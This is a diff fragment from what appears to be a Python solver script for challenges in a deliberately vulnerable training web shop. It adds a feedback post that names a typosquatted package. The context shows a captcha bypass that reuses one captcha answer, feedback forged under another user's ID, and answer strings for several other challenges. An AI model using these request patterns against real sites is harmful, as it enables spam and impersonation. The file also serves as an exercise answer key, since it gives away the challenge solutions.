@@ -112,6 +112,8 @@ for i in range(11):
 	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
 # ---- Forged Feedback (Post some feedback in another users name.)
 # See "Captcha Bypass" part
+# ---- Frontend Typosquatting (Inform the shop about a typosquatting imposter that dug itself deep into the frontend. (Mention the exact name of the culprit))
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'ng2-bar-rating','rating':3})
 # ---- Leaked Unsafe Product (Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.)
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Eurogium Edule Hueteroneel','rating':3})
 # ---- Legacy Typosquatting (Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit))
